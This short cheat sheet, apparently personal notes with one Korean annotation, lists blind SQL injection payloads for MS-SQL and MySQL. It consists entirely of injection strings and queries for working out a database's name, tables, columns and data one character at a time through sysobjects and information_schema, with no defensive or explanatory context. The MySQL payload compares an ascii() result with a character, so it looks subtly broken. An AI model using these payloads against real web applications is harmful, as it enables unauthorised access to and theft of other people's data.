<MS-SQL><br>
#Shape<br>
select * from board where Title='//' and substring((query), 1, 1) < 'a'--<br>
???' and substring((query), 1, 1) < 'a'--<br>
<br>
#get DB NAME<br>
db_name()<br>
<br>
#Get Table name<br>
select top 1 name from sysobjects where xtype='U'<br>
<br>
#Get Column name<br>
select top 1 column_name from information_schema.columns where table_name = '[Table Name]'<br>
<br>
#Get Data<br>
select top 1 [Column Name] from [Table Name]<br>
<br>
<br>
<br>
<MySQL><br>
???' and ascii(substring((query), 1, 1)) > 'a'#<br>
<br>
#Get Table Name<br>
select table_name from information_schema.tables where table_type='base table' limit 0,1<br>
                                                                                     ㄴ> 0번 째 테이블<br>
  
